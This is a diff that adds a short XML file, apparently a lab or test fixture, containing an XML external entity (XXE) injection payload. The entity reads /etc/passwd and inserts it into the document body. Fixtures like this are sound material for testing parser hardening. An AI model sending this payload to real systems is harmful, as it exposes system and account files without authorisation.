@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY lab_test SYSTEM "file:///etc/passwd">
+]>
+<data>
+  <item>&lab_test;</item>
+</data>
